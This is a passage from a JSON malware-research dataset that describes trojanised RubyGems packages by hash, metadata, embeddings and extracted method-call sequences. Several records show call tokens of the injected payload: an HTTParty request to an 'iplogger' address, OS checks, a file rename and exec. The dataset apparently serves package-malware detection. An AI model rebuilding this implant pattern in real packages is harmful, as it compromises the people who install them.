'@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@defaultIndex.nil?.!', '@defaultIndex.nil?', '@style.nil?.!', '@style.nil?', '@beep.==', '@lockin.==', '@wraplist.==', '@allowAnswer.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', '@entries.each', 'index.<', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', '@selection.==', '@icon.==', '@dial.==', '@icon.nil?.!', '@icon.nil?', 'escape', 'escape', '@selection.nil?.!', '@selection.nil?', 'escape', '@dial.nil?.!', '@dial.nil?', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@doneAction.nil?.!', '@doneAction.nil?', 'escape', '@beep.==', '@timeout.!=', '@lockin.==', '@allowAnswer.==', '@allowDTMF.==', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', 'escape', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=']",
            "n_tokens": 2328,
            "embedding": "[ 0.01070469 -0.00289823 -0.00833299 ... -0.01209657 -0.02107972\n  0.01827764]",
            "cluster": "0",
            "id": 320,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml_api/1.1.4/aastra-xml_api-1.1.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml_api/1.1.4/aastra-xml_api-1.1.4_extracted",
            "name": "aastra-xml_api",
            "version": "1.1.4",
            "published_at": "2020-02-19T03:38:51.623Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler",
            "SHA-256": "29d3406f6eaddb98df041fda0853bbd01307cec57b75f8672ce625b5ec5f2767"
        },
        {
            "name_version": "abiquo_api-0.1.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/abiquo_api/0.1.3/abiquo_api-0.1.3_extracted/abiquo_api-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'include', 'attr_reader', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'api_url.nil?', 'raise', 'api_username.nil?', 'api_password.nil?', 'api_key.nil?', 'api_secret.nil?', 'token_key.nil?', 'token_secret.nil?', 'access_token.nil?', 'raise', 'api_key.nil?', 'access_token.nil?', 'AbiquoAPIClient::HTTPClient.new', 'options.has_key?', 'options.[](:version).[]', 'options.[]', '@http_client.request({ expects: [200], method: \"GET\", path: \"version\", accept: \"text/plain\" }).delete(\"\\\\n\").[]', '@http_client.request({ expects: [200], method: \"GET\", path: \"version\", accept: \"text/plain\" }).delete', '@http_client.request', '@http_client.request', 'AbiquoAPIClient::Link.new', 'loginresp.[](\"links\").select { |l,|\\n  l.[](\"rel\") == \"enterprise\"\\n}.first', 'loginresp.[](\"links\").select', 'loginresp.[]', 'l.[](\"rel\").==', 'l.[]', 'AbiquoAPIClient::LinkModel.new', 'loginresp.merge', '@http_client.request', 'AbiquoAPIClient::LinkModel.new', 'hash.merge', 'AbiquoAPI::LinkCollection.new', 'self.get', 'link.type', 'options.[](:accept).nil?', 'options.[]', 'link.type', 'options.delete', 'link.href', 'accept.eql?', 'req_hash.[]=', '@http_client.request', 'resp.[](\"collection\").nil?', 'resp.[]', 'AbiquoAPIClient::LinkModel.new', 'resp.merge', 'options.[](:content).nil?', 'options.[]', 'link.type', 'options.delete', 'options.[](:accept).nil?', 'options.[]', 'link.type', 'options.delete', 'link.href', 'accept.eql?', 'req_hash.[]=', 'ctype.eql?', 'req_hash.[]=', '@http_client.request', 'resp.nil?', 'AbiquoAPIClient::LinkModel.new', '{ client: self }.merge', 'options.[](:content).nil?', 'options.[]', 'link.type', 'options.delete', 'options.[](:accept).nil?', 'options.[]', 'link.type', 'options.delete', 'link.href', 'accept.eql?', 'req_hash.[]=', 'ctype.eql?', 'req_hash.[]=', '@http_client.request', 'resp.nil?', 'AbiquoAPIClient::LinkModel.new', '{ client: self }.merge', '@http_client.request', 'link.href', 'resp.nil?', 'AbiquoAPIClient::LinkModel.new', '{ client: self }.merge', 'require', 'parsed_response.[](\"totalSize\").nil?', 'parsed_response.[]', 'parsed_response.[](\"collection\").count', 'parsed_response.[]', 'parsed_response.[]', 'type.include?', 'type.split(\";\").first', 'type.split', 'parsed_response.[](\"links\").empty?', 'parsed_response.[]', 'URI.parse', 'parsed_response.[](\"links\").first.[]', 'parsed_response.[](\"links\").first', 'parsed_response.[]', 'coluri.path', 'coluri.query', 'opts.nil?', 'opts.split(\"&\").map { |e,|\\n  { e.split(\"=\").first.to_sym => e.split(\"=\").last }\\n}.reduce', 'opts.split(\"&\").map', 'opts.split', 'e.split(\"=\").first.to_sym', 'e.split(\"=\").first', 'e.split', 'e.split(\"=\").last', 'e.split', 'pairs.each', 'h.[]', 'opt_hash.[](:limit).to_i', 'opt_hash.[]', 'opt_hash.[](:startwith).nil?', 'opt_hash.[]', 'opt_hash.[](:startwith).to_i', 'opt_hash.[]', '@page_size.==', '@page_size.>', '(st / @page_size)\\n.+', 'st./', 'parsed_response.[]', 'parsed_response.[](\"collection\").map', 'parsed_response.[]', 'client.new_object', 'count.nil?', '@collection.first', '@collection.first(count).each', '@collection.first', 'out.<<', 'each', 'each', 'out.<<', 'each', 'out.<<', 'each', 'out.<<', 'block_given?', '@current_page.==', '@current_page.nil?', 'retrieve', 'next_page.nil?', 'loop', '@collection.each', '@links.nil?', '@links.select { |l,|\\n  l.[](\"rel\").eql?(\"next\")\\n}.first.nil?', '@links.select { |l,|\\n  l.[](\"rel\").eql?(\"next\")\\n}.first', '@links.select', 'l.[](\"rel\").eql?', 'l.[]', 'retrieve', 'next_page.nil?', 'self.to_enum', 'Thread.current.[]', 'Thread.current', 'Formatador.new', 'Thread.current.[](:formatador).indentation', 'Thread.current.[]', 'Thread.current', 'self.class.name', 'self.class', 'Thread.current.[](:formatador).indent', 'Thread.current.[]', 'Thread.current', 'self.instance_variables.empty?', 'self.instance_variables', 'self.instance_variables.clone', 'self.instance_variables', 'vars.delete', 'vars.delete', 'data.<<', 'data.<<', 'vars.map { |v,|\\n  \"#{v}=#{instance_variable_get(v.to_s).inspect}\"\\n}.join', 'vars.map', 'instance_variable_get(v.to_s).inspect', 'instance_variable_get', 'v.to_s', 'data.<<', 'private', '@links.nil?', '@links.select { |l,|\\n  l.[](\"rel\").eql?(rel)\\n}.first', '@links.select', 'l.[](\"rel\").eql?', 'l.[]', 'f.nil?', 'URI.parse(f.[](\"href\")).query.split(\"&\").map', 'URI.parse(f.[](\"href\")).query.split', 'URI.parse(f.[](\"href\")).query', 'URI.parse', 'f.[]', 'it.split', 'Hash.[]', 'q.map', 'k.to_sym', 'AbiquoAPIClient::Link.new', 'f.[]', '@client.get', 'opts.[](:startwith).nil?', 'opts.[]', 'opts.[](:startwith).to_i', 'opts.[]', '@page_size.==', '@page_size.>', '(st / @page_size)\\n.+', 'st./', 'resp.[]', 'resp.[](\"collection\").map', 'resp.[]', '@client.new_object', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'attr_reader', 'creds.has_key?', 'Faraday.new', 'c.authorization', 'creds.[]', 'c.adapter', 'creds.has_key?', 'Faraday.new', 'c.request', 'c.adapter', 'Faraday.new', 'c.basic_auth', 'creds.[]', 'creds.[]', 'c.adapter', 'params.reject!', 'v.nil?', 'params.has_key?', 'headers.merge!', 'params.delete', 'params.has_key?', 'headers.merge!', 'params.delete', '@cookies.nil?', 'headers.merge!', 'params.has_key?', 'params.[](:headers).merge!', 'params.[]', 'params.[]=', 'issue_request', 'response.nil?', 'response.body.empty?', 'response.body', 'JSON.parse', 'response.body', 'response.body', 'private', 'Addressable::URI.parse', 'params.[]', 'full_path.host.nil?', 'full_path.host', 'Addressable::URI.parse', '@connection.url_prefix.to_s + \"/\".+', '@connection.url_prefix.to_s.+', '@connection.url_prefix.to_s', '@connection.url_prefix', 'params.[](:path).gsub', 'params.[]', '@connection.url_prefix.path', '@connection.url_prefix', 'Addressable::URI.parse', 'params.[]', 'full_url.query_values=', 'params.[]', '@connection.run_request', 'params.[](:method).downcase.to_sym', 'params.[](:method).downcase', 'params.[]', 'full_url.to_s', 'params.[]', 'params.[]', 'Hash.[]', 'resp.headers.select { |k,|\\n  k.eql?(\"Set-Cookie\")\\n}.map', 'resp.headers.select', 'resp.headers', 'k.eql?', 'resp.status.==', 'resp.status', 'resp.status.>=', 'resp.status', 'resp.status.<=', 'resp.status', 'resp.body.nil?', 'resp.body', 'JSON.parse', 'resp.body', 'error_response.[](\"collection\").[](0).[]', 'error_response.[](\"collection\").[]', 'error_response.[]', 'error_response.[](\"collection\").[](0).[]', 'error_response.[](\"collection\").[]', 'error_response.[]', 'resp.status', 'raise', 'raise', 'raise', 'raise', 'raise', 'error_code.==', 'error_text.==', 'raise', 'resp.body', 'raise', 'require', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'hash.keys.include?', 'hash.keys', 'hash.delete', 'Hash.[]', 'hash.map', 'k.to_sym', 'h.[](:href).nil?', 'h.[]', 'h.[]', 'h.[](:rel).nil?', 'h.[]', 'h.[]', 'h.[](:title).nil?', 'h.[]', 'h.[]', 'h.[](:type).nil?', 'h.[]', 'h.[]', '@client.nil?', '@client.get', 'r.is_a?', 'AbiquoAPI::LinkCollection.new', 'self.type', 'self.href.nil?', 'self.href', 'self.href', 'self.rel.nil?', 'self.rel', 'self.rel', 'self.title.nil?', 'self.title', 'self.title', 'self.type.nil?', 'self.type', 'self.type', 'Thread.current.[]', 'Thread.current', 'Formatador.new', 'Thread.current.[](:formatador).indentation', 'Thread.current.[]', 'Thread.current', 'self.class.name', 'self.class', 'Thread.current.[](:formatador).indent', 'Thread.current.[]', 'Thread.current', 'self.instance_variables.empty?', 'self.instance_variables', 'self.instance_variables.clone', 'self.instance_variables', 'vars.delete', 'data.<<', 'data.<<', 'vars.map { |v,|\\n  \"#{v}=#{instance_variable_get(v.to_s).inspect}\"\\n}.join', 'vars.map', 'instance_variable_get(v.to_s).inspect', 'instance_variable_get', 'v.to_s', 'data.<<', 'require', 'attrs.[](:client).nil?', 'attrs.[]', 'raise', 'attrs.delete', 'Hash.[]', 'attrs.clone.map', 'attrs.clone', 'k.to_s', 'attributes.[](\"links\").nil?.!', 'attributes.[](\"links\").nil?', 'attributes.[]', 'attributes.[](\"links\").each', 'attributes.[]', 'link.is_a?', 'link.to_hash', '\"edit\".eql?', 'link.[]', '\"self\".eql?', 'link.[]', 'create_attr', 'instance_variable_set', 'link.[]', 'link.[](\"rel\").gsub', 'link.[]', 'new_lnk.[]=', 'rel.to_sym', 'Link.new', 'link.merge', 'links.<<', 'link.[](\"href\").split(\"/\").last.is_a?', 'link.[](\"href\").split(\"/\").last', 'link.[](\"href\").split', 'link.[]', 'link.[](\"rel\").gsub', 'link.[]', 'create_attr', 'instance_variable_set', 'link.[](\"href\").split(\"/\").last.to_i', 'link.[](\"href\").split(\"/\").last', 'link.[](\"href\").split', 'link.[]', 'attributes.delete', 'create_attr', 'instance_variable_set', 'attributes.keys.each', 'attributes.keys', 'create_attr', 'instance_variable_set', 'attributes.[]', 'self.instance_variables.map', 'self.instance_variables', 'v.to_s', 'att.delete', 'att.delete', 'self.links.each', 'self.links', 'links.<<', 'l.values.first.to_hash', 'l.values.first', 'l.values', 'att.delete', 'att.each', 'data.[]=', 'opt.delete', 'instance_variable_get', 'data.[]=', 'data.to_json', 'Thread.current.[]', 'Thread.current', 'Formatador.new', 'Thread.current.[](:formatador).indentation', 'Thread.current.[]', 'Thread.current', 'self.class.name', 'self.class', 'Thread.current.[](:formatador).indent', 'Thread.current.[]', 'Thread.current', 'self.instance_variables.empty?', 'self.instance_variables', 'self.instance_variables.clone', 'self.instance_variables', 'vars.delete', 'data.<<', 'data.<<', 'vars.map { |v,|\\n  \"#{v}=#{instance_variable_get(v.to_s).inspect}\"\\n}.join', 'vars.map', 'instance_variable_get(v.to_s).inspect', 'instance_variable_get', 'v.to_s', 'Thread.current.[](:formatador).indentation', 'Thread.current.[]', 'Thread.current', 'data.<<', 'Thread.current.[](:formatador).indentation', 'Thread.current.[]', 'Thread.current', 'self.links.map { |l,|\\n  l.values\\n}.flatten', 'self.links.map', 'self.links', 'l.values', 'self.links.select { |l,|\\n  l.[](link_rel)\\n}.map { |t,|\\n  t.values\\n}.flatten', 'self.links.select { |l,|\\n  l.[](link_rel)\\n}.map', 'self.links.select', 'self.links', 'l.[]', 't.values', 'ls.count', 'ls.first', 'self.links.select { |l,|\\n  l.[](link_rel)\\n}.count', 'self.links.select', 'self.links', 'l.[]', 'c.==', '@client.put', 'self.link', 'self.to_json', '@client.delete', 'self.link', 'self.link(:edit).get', 'self.link', 'private', 'self.class.send', 'self.class', 'create_method', '\"#{name}=\".to_sym', 'instance_variable_set', '\"@\".+', 'create_method', 'name.to_sym', 'instance_variable_get', '\"@\".+']",
            "n_tokens": 3267,
            "embedding": "[-0.008026   -0.00799666 -0.00326714 ...  0.00115548 -0.03145841\n  0.00945415]",
            "cluster": "0",
            "id": 324,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/abiquo_api/0.1.3/abiquo_api-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/abiquo_api/0.1.3/abiquo_api-0.1.3_extracted",
            "name": "abiquo_api",
            "version": "0.1.3",
            "published_at": "2020-02-19T03:39:36.158Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "excon, faraday, faraday_middleware, simple_oauth, formatador, addressable, json",
            "SHA-256": "747fba01d22063ede1729fad7b92751c6b75339aa98b289618b3f4dc0dddb58a"
        },
        {
            "name_version": "aastra-xml-api-1.1.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml-api/1.1.4/aastra-xml-api-1.1.4_extracted/aastra-xml-api-1.1.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', '[\"version\", \"array_extensions\", \"phone\", \"phone_configuration\", \"phone_configuration_entry\", \"phone_directory\", \"phone_directory_entry\", \"phone_execute\", \"phone_execute_entry\", \"phone_formatted_text_screen\", \"phone_formatted_text_screen_entry\", \"phone_icon_entry\", \"phone_image_menu\", \"phone_image_menu_entry\", \"phone_image_screen\", \"phone_input_screen\", \"phone_input_screen_entry\", \"phone_softkey_entry\", \"phone_status\", \"phone_status_entry\", \"phone_text_menu\", \"phone_text_menu_entry\", \"phone_text_screen\"].each', 'require', 'self.sort', 'str1.match', 'str2.match', '[a, b].include?', 'str1.<=>', '(comp = a.pre_match <=> b.pre_match)\\n.==', 'a.pre_match.<=>', 'a.pre_match', 'b.pre_match', 'a.[](0).==', 'a.[]', 'b.[]', 'a.[](0) + a.post_match.<=>', 'a.[](0).+', 'a.[]', 'a.post_match', 'b.[](0).+', 'b.[]', 'b.post_match', 'a.[](0).to_i.<=>', 'a.[](0).to_i', 'a.[]', 'b.[](0).to_i', 'b.[]', 'a.post_match', 'b.post_match', 'str1.match', 'str2.match', 'self.replace', 'natsort', 'PhoneSoftkeyEntry.new', 'escape', 'escape', 'PhoneIconEntry.new', 's.nil?', 'CGI.escapeHTML', 's.each', 'HIGHASCII.[](char).nil?.!', 'HIGHASCII.[](char).nil?', 'HIGHASCII.[]', 'HIGHASCII.[]', 'PhoneConfigurationEntry.new', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'escape', 'escape', 'PhoneDirectoryEntry.new', '@entries.size.-', '@entries.size', '@entries.[](i).getName', '@entries.[]', 'linklist.[]=', '@entries.[](i).getName', '@entries.[]', 'tmparray.extend', 'tmparray.natsort!', 'tmparray.each', '@entries.[]', 'linklist.[]', '@previous.nil?.!', '@previous.nil?', 'escape', '@next.nil?.!', '@next.nil?', 'escape', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@lockin.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', 'escape', '@title_wrap.==', '@entries.each', 'index.<', 'entry.render', '@softkeys.each', 'softkey.render', 'escape', 'escape', 'PhoneExecuteEntry.new', 'escape', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'escape', '@interruptCall.==', 'PhoneFormattedTextScreenEntry.new', 'PhoneFormattedTextScreenEntry.new', 'PhoneFormattedTextScreenEntry.new', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@doneAction.nil?.!', '@doneAction.nil?', 'escape', '@beep.==', '@lockin.==', '@allowAnswer.==', '@timeout.!=', '@allowDTMF.==', 'yes', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'size.==', 'convert_high_ascii', '@size.nil?.!', '@size.nil?', '@align.nil?.!', '@align.nil?', 'escape', '@size.nil?.!', '@size.nil?', 'require', 'GD::Image.new', '@img.colorAllocate', '@img.colorAllocate', 'RUBY_PLATFORM.downcase', 'os.scan(/win/).nil?.!', 'os.scan(/win/).nil?', 'os.scan', 'os.scan(/linux$/).nil?.!', 'os.scan(/linux$/).nil?', 'os.scan', 'os.scan(/darwin\\\\d+\\\\.\\\\d+$/).nil?.!', 'os.scan(/darwin\\\\d+\\\\.\\\\d+$/).nil?', 'os.scan', 'ENV.[]=', 'ENV.[]=', '@img.stringTTF', 'getColor', '@img.string', 'getColor', '@img.filledRectangle', 'getColor', '@img.rectangle', 'getColor', '@img.filledEllipse', 'getColor', '@img.ellipse', 'getColor', '@img.dashedLine', 'getColor', '@img.line', 'getColor', 'index.==', 'PhoneImageMenuEntry.new', 'gdImage.getGDImage', 'img.getPixel', 'rgb.>', '2.**', '7.-', 'i.%', '(i % 8)\\n.==', 'i.%', '\"%02x\".%', 'setImage', 'setSize', 'escape', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@locking.==', '@timeout.!=', '@verticalAlign.nil?.!', '@verticalAlign.nil?', '@horizontalAlign.nil?.!', '@horizontalAlign.nil?', '@height.nil?.!', '@height.nil?', '@width.nil?.!', '@width.nil?', '@uriBase.nil?.!', '@uriBase.nil?', 'escape', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'escape', 'gdImage.getGDImage', 'img.getPixel', 'rgb.>', '2.**', '7.-', 'i.%', '(i % 8)\\n.==', 'i.%', '\"%02x\".%', 'setImage', 'setSize', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@beep.==', '@locking.==', '@timeout.!=', '@allowDTMF.==', '@verticalAlign.nil?.!', '@verticalAlign.nil?', '@horizontalAlign.nil?.!', '@horizontalAlign.nil?', '@height.nil?.!', '@height.nil?', '@width.nil?.!', '@width.nil?', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'PhoneInputScreenEntry.new', '@entries.[](@entries.size - 1).setType', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setPassword', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setEditable', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setParameter', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setPrompt', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setDefault', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).setSelection', '@entries.[]', '@entries.size.-', '@entries.size', '@entries.[](@entries.size - 1).addSoftkey', '@entries.[]', '@entries.size.-', '@entries.size', '@type.nil?', '@password.==', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@editable.==', '@beep.==', '@defaultindex.nil?.!', '@defaultindex.nil?', '@inputlanguage.nil?.!', '@inputlanguage.nil?', '@displaymode.nil?.!', '@displaymode.nil?', '@lockin.==', '@allowAnswer.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', '@prompt.nil?.!', '@prompt.nil?', 'escape', 'escape', '@parameter.nil?.!', '@parameter.nil?', '@entries.each', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', 'PhoneSoftkeyEntry.new', '@type.nil?.!', '@type.nil?', '@password.==', '@editable.==', '@prompt.nil?.!', '@prompt.nil?', '@parameter.nil?.!', '@parameter.nil?', '@selection.nil?.!', '@selection.nil?', '@default.nil?.!', '@default.nil?', '@softkeys.each', 'softkey.render', '@icon.nil?.!', '@icon.nil?', 'PhoneStatusEntry.new', '@beep.==', '@triggerDestroyOnExit.==', '@entries.each', 'entry.render', 'setType', 'type.nil?', 'type.nil?.!', 'type.nil?', 'escape', '@type.nil?.!', '@type.nil?', 'escape', '@timeout.nil?.!', '@timeout.nil?', 'escape', 'PhoneTextMenuEntry.new', '@entries.size.-', '@entries.size', '@entries.[](i).getName', '@entries.[]', 'linklist.[]=', '@entries.[](i).getName', '@entries.[]', 'tmparray.extend', 'tmparray.natsort!', 'tmparray.each', '@entries.[]', 'linklist.[]', '@maxitems.nil?', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@defaultIndex.nil?.!', '@defaultIndex.nil?', '@style.nil?.!', '@style.nil?', '@beep.==', '@lockin.==', '@wraplist.==', '@allowAnswer.==', '@timeout.!=', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', '@entries.each', 'index.<', 'entry.render', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=', '@selection.==', '@icon.==', '@dial.==', '@icon.nil?.!', '@icon.nil?', 'escape', 'escape', '@selection.nil?.!', '@selection.nil?', 'escape', '@dial.nil?.!', '@dial.nil?', '@destroyOnExit.==', '@cancelAction.nil?.!', '@cancelAction.nil?', 'escape', '@doneAction.nil?.!', '@doneAction.nil?', 'escape', '@beep.==', '@timeout.!=', '@lockin.==', '@allowAnswer.==', '@allowDTMF.==', '@title.nil?.!', '@title.nil?', '@title_wrap.==', 'escape', 'escape', '@softkeys.each', 'softkey.render', '@icons.each', 'iconList.==', 'icon.render', 'iconList.!=']",
            "n_tokens": 2369,
            "embedding": "[ 0.00677282 -0.00651178 -0.00576662 ... -0.01384939 -0.02135786\n  0.01568142]",
            "cluster": "0",
            "id": 387,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml-api/1.1.4/aastra-xml-api-1.1.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aastra-xml-api/1.1.4/aastra-xml-api-1.1.4_extracted",
            "name": "aastra-xml-api",
            "version": "1.1.4",
            "published_at": "2020-02-20T02:49:35.494Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler",
            "SHA-256": "23f6aad6ce9765585af3a64bd8ccd90690561aafde0b72ee0ad188aa20bdbf19"
        },
        {
            "name_version": "active-redis_stats-0.1.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-redis_stats/0.1.3/active-redis_stats-0.1.3_extracted/active-redis_stats-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', '[\"active_object\", \"active_redis_db\", \"active_support/core_ext/time\"].each', 'require', '[\"version\", \"base\"].each', 'require', '[\"base\", \"set\", \"get\"].each', '[\"count\", \"rank\"].each', 'require', 'Time.current.utc.freeze', 'Time.current.utc', 'Time.current', '{ hour: \"year-month-day-hour-minute\", day: \"year-month-day-hour\", month: \"year-month-day\", year: \"year-month\", all: \"year\", inf: \"inf\" }.freeze', '{ hour: 25200, day: 691200, month: 31708800, year: 317174400, all: 317174400, inf: nil }.freeze', 'format.to_sym', 'format.==', 'time.format', 'FORMATS.[]', 'interval_key', 'offset.minutes.ago', 'offset.minutes', '30.*', '29.+', '0.+', 'max.downto(min).collect', 'max.downto', 'interval_key', 'num.minutes.ago', 'num.minutes', 'interval_key', 'offset.days.ago', 'offset.days', 'offset.days.ago(TIME).beginning_of_day', 'offset.days.ago', 'offset.days', '0.upto(23).collect', '0.upto', 'interval_key', 'num.hours.from_now', 'num.hours', 'interval_key', 'offset.months.ago', 'offset.months', 'offset.months.ago(TIME).beginning_of_month', 'offset.months.ago', 'offset.months', 'boy.end_of_month.day.-', 'boy.end_of_month.day', 'boy.end_of_month', '0.upto(max).collect', '0.upto', 'interval_key', 'num.days.from_now', 'num.days', 'interval_key', 'offset.years.ago', 'offset.years', 'offset.years.ago(TIME).beginning_of_year', 'offset.years.ago', 'offset.years', '0.upto(11).collect', '0.upto', 'interval_key', 'num.months.from_now', 'num.months', 'interval_key', '9.+', '0.+', 'max.downto(min).collect', 'max.downto', 'interval_key', 'num.years.ago', 'num.years', 'seconds.nil?', 'ActiveRedisDB::Key.expire', 'primary_key', 'ActiveRedisDB::String.evaluate.find', 'ActiveRedisDB::String.evaluate', 'primary_key', 'send', 'keys.collect', 'primary_key', 'ActiveRedisDB::String.evaluate.find_each(*keys).map', 'ActiveRedisDB::String.evaluate.find_each', 'ActiveRedisDB::String.evaluate', '[:decrement, :increment].each', 'define_method', 'ActiveRedisDB::String.send', 'primary_key', 'define_method', 'ActiveRedisStats::Base::EXPIRES.each', 'interval_key', 'send', 'expiration', 'ActiveRedisDB::SortedSet.evaluate.all_reverse', 'ActiveRedisDB::SortedSet.evaluate', 'primary_key', 'send', 'all', 'ActiveRedisDB::SortedSet.evaluate.between_reverse', 'ActiveRedisDB::SortedSet.evaluate', 'primary_key', 'send', 'between', 'ActiveRedisDB::SortedSet.evaluate.between', 'ActiveRedisDB::SortedSet.evaluate', 'primary_key', 'send', 'bottom', 'ActiveRedisDB::SortedSet.evaluate.between_reverse', 'ActiveRedisDB::SortedSet.evaluate', 'primary_key', 'send', 'top', '[:decrement, :increment].each', 'define_method', 'ActiveRedisDB::SortedSet.send', 'primary_key', 'val.to_s', 'define_method', 'ActiveRedisStats::Base::EXPIRES.each', 'interval_key', 'send', 'expiration']",
            "n_tokens": 901,
            "embedding": "[-1.31366281e-02  8.00544731e-05 -1.65087311e-03 ... -1.52021041e-03\n -1.55890668e-02  1.76595692e-02]",
            "cluster": "0",
            "id": 750,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-redis_stats/0.1.3/active-redis_stats-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-redis_stats/0.1.3/active-redis_stats-0.1.3_extracted",
            "name": "active-redis_stats",
            "version": "0.1.3",
            "published_at": "2020-02-20T18:50:36.797Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, coveralls, fakeredis, fasterer, generator_spec, rake, reek, rspec, rubocop, active_object, active_redis_db, activesupport",
            "SHA-256": "0b5eedad5f3f8da01e0db1684d0edd8ce7e0c036a67f4aaaa2bb1fed25387cd5"
        },
        {
            "name_version": "admiral-stats_parser-1.17.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admiral-stats_parser/1.17.1/admiral-stats_parser-1.17.1_extracted/admiral-stats_parser-1.17.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'exported_at.<', 'Time.parse', 'self.get_latest_api_version', 'PersonalBasicInfoParser.parse', 'PersonalBasicInfoParser.parse', 'PersonalBasicInfoParser.parse', 'raise', 'AreaCaptureInfoParser.parse', 